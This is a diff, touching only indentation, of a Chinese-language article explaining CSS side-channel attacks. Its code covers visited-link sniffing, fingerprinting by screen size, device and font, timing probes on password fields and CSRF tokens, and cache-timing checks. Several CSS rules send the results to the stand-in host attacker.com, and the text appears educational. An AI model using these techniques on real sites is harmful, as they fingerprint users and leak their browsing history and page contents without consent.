@@ -30,7 +30,7 @@ CSS 侧信道是指：虽然CSS不能直接读取数据，但可以通过**间�
 
 ```css
 a:visited {
-  background-image: url('https://attacker.com/visited/example.com');
+ background-image: url('https://attacker.com/visited/example.com');
 }
 ```
 
@@ -44,8 +44,8 @@ a:visited {
 **1. 通过渲染时间差异**
 ```css
 a:visited {
-  /* 复杂的滤镜/转换——导致重绘时间差异 */
-  filter: blur(0.1px);
+ /* 复杂的滤镜/转换——导致重绘时间差异 */
+ filter: blur(0.1px);
 }
 
 /* JS侧——通过测量布局时间判断是否应用了filter */
@@ -55,7 +55,7 @@ a:visited {
 利用`mix-blend-mode`产生微小的像素差异：
 ```css
 a:visited {
-  mix-blend-mode: difference;
+ mix-blend-mode: difference;
 }
 /* 通过Canvas渲染 + 逐像素对比判断 */
 ```
@@ -64,7 +64,7 @@ a:visited {
 ```css
 /* 在不同源的iframe中无法跨DOM，但可以在父页面匹配iframe的URL属性 */
 a[href="https://secret.example.com"]:visited {
-  /* 父页面中的 <a> 标签可以匹配特定URL */
+ /* 父页面中的 <a> 标签可以匹配特定URL */
 }
 ```
 
@@ -74,22 +74,22 @@ a[href="https://secret.example.com"]:visited {
 
 ```css
 @media (max-width: 1920px) and (min-width: 1680px) {
-  /* 用户屏幕宽度 1680-1920 */
-  body { background-image: url('https://attacker.com/res/1680-1920'); }
+ /* 用户屏幕宽度 1680-1920 */
+ body { background-image: url('https://attacker.com/res/1680-1920'); }
 }
 
 @media (max-width: 1680px) and (min-width: 1440px) {
-  body { background-image: url('https://attacker.com/res/1440-1680'); }
+ body { background-image: url('https://attacker.com/res/1440-1680'); }
 }
 
 @media (pointer: coarse) {
-  /* 触屏设备 */
-  body { background-image: url('https://attacker.com/device/touch'); }
+ /* 触屏设备 */
+ body { background-image: url('https://attacker.com/device/touch'); }
 }
 
 @media (hover: none) {
-  /* 无悬停能力（可能是移动端） */
-  body { background-image: url('https://attacker.com/device/nohover'); }
+ /* 无悬停能力（可能是移动端） */
+ body { background-image: url('https://attacker.com/device/nohover'); }
 }
 ```
 
@@ -128,12 +128,12 @@ const start = performance.now();
 // 注入一个会大量重排的CSS规则
 document.querySelector('#sensitive').style.animation = 'x .001s';
 requestAnimationFrame(() => {
-  const time = performance.now() - start;
-  if (time > 5) {
-    // 重排耗时较长 → 选择器匹配成功
-  } else {
-    // 重排耗时短 → 选择器未匹配
-  }
+ const time = performance.now() - start;
+ if (time > 5) {
+ // 重排耗时较长 → 选择器匹配成功
+ } else {
+ // 重排耗时短 → 选择器未匹配
+ }
 });
 ```
 
@@ -142,8 +142,8 @@ requestAnimationFrame(() => {
 ```css
 /* 大量元素匹配会触发更多渲染工作 */
 input[type="password"]:not(:placeholder-shown) ~ * {
-  /* 如果密码框含有内容，触发大量CSS重算 */
-  transition: all .001s;
+ /* 如果密码框含有内容，触发大量CSS重算 */
+ transition: all .001s;
 }
 ```
 
@@ -155,8 +155,8 @@ input[type="password"]:not(:placeholder-shown) ~ * {
 /* 通过 font-family fallback 探测系统安装了哪些字体 */
 span { font-family: "Calibri", "FallbackFont1", sans-serif; }
 span[style*="Calibri"] {
-  /* 如果匹配到Calibri（Windows系统），触发URL请求 */
-  background-image: url('https://attacker.com/font/calibri');
+ /* 如果匹配到Calibri（Windows系统），触发URL请求 */
+ background-image: url('https://attacker.com/font/calibri');
 }
 ```
 
@@ -167,13 +167,13 @@ span[style*="Calibri"] {
 ```javascript
 // 测量某字体下特定字符串的渲染宽度
 function fontExists(fontName) {
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  ctx.font = `72px "${fontName}", serif`;
-  const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-  ctx.font = '72px serif';
-  const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-  return width1 !== width2;
+ const canvas = document.createElement('canvas');
+ const ctx = canvas.getContext('2d');
+ ctx.font = `72px "${fontName}", serif`;
+ const width1 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+ ctx.font = '72px serif';
+ const width2 = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+ return width1 !== width2;
 }
 ```
 
@@ -192,11 +192,11 @@ CSS混合模式（`mix-blend-mode`）决定了元素与背景的混合方式。�
 
 ```css
 .overlay {
-  mix-blend-mode: difference;
-  background-color: #fff;
-  position: absolute;
-  top: 0;
-  left: 0;
+ mix-blend-mode: difference;
+ background-color: #fff;
+ position: absolute;
+ top: 0;
+ left: 0;
 }
 ```
 
@@ -207,8 +207,8 @@ CSS混合模式（`mix-blend-mode`）决定了元素与背景的混合方式。�
 ```css
 /* 利用 -webkit-text-security 和自定义渲染 */
 .csrf-token {
-  -webkit-text-security: disc; /* 密码遮罩效果 */
-  font-family: monospace;
+ -webkit-text-security: disc; /* 密码遮罩效果 */
+ font-family: monospace;
 }
 /* 不同字符宽度不同，通过测量元素宽度可推断字符数 */
 ```
@@ -218,7 +218,7 @@ CSS混合模式（`mix-blend-mode`）决定了元素与背景的混合方式。�
 ```css
 /* SVG feColorMatrix 滤镜 */
 svg filter feColorMatrix {
-  values: "1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0";
+ values: "1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0";
 }
 /* 不同的矩阵值产生不同色彩 → 截屏对比可推断原始颜色 */
 ```
@@ -230,7 +230,7 @@ svg filter feColorMatrix {
 ```css
 /* 如果页面有某元素，:has()匹配成功 */
 html:has(input[type="password"]) {
-  --has-password: 1;
+ --has-password: 1;
 }
 
 /* 通过JS的getComputedStyle性能差异推断 */
@@ -240,8 +240,8 @@ html:has(input[type="password"]) {
 
 ```css
 @container (min-width: 100px) {
-  /* 容器查询满足条件时触发 */
-  .target { background: url(https://attacker.com/container_match); }
+ /* 容器查询满足条件时触发 */
+ .target { background: url(https://attacker.com/container_match); }
 }
 ```
 
@@ -253,9 +253,9 @@ const img = new Image();
 const start = performance.now();
 img.src = 'https://target.com/sensitive-image.png';
 img.onload = () => {
-  const time = performance.now() - start;
-  // 如果time极短 → 图片已缓存（用户之前访问过）
-  // 如果time长 → 图片未缓存（首次加载）
+ const time = performance.now() - start;
+ // 如果time极短 → 图片已缓存（用户之前访问过）
+ // 如果time长 → 图片未缓存（首次加载）
 };
 ```
 
